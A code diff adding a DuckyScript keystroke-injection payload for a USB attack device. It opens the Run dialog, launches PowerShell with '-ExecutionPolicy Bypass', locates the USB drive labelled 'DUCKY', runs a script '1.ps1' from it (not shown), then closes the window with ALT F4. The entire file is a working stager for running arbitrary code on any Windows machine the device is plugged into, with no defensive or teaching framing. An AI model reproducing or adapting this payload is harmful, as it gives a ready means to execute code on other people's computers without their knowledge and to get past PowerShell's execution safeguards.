@@ -1,0 +1,38 @@
+ATTACKMODE HID STORAGE
+DEFAULTDELAY 200
+
+REM Open PowerShell with script execution enabled
+GUI r
+DELAY 500
+STRING powershell -ExecutionPolicy Bypass
+DELAY 1000
+ENTER
+
+REM Wait for PowerShell to open fully
+DELAY 2000
+
+REM Get USB drive letter and change to the drive (assuming drive label is DUCKY)
+DELAY 300
+STRING $targetLabel = "DUCKY"
+ENTER
+DELAY 300
+STRING $volume = Get-Volume | Where-Object { $_.FileSystemLabel -eq $targetLabel }
+ENTER
+DELAY 300
+STRING $driveLetter = $volume.DriveLetter + ":"
+ENTER
+DELAY 300
+STRING cd $driveLetter
+ENTER
+
+REM Execute PowerShell script (ensure 1.ps1 exists on the USB drive)
+DELAY 500
+STRING .\1.ps1
+ENTER
+
+REM Wait for the script to finish executing
+DELAY 5000
+
+REM Close PowerShell
+DELAY 500
+ALT F4
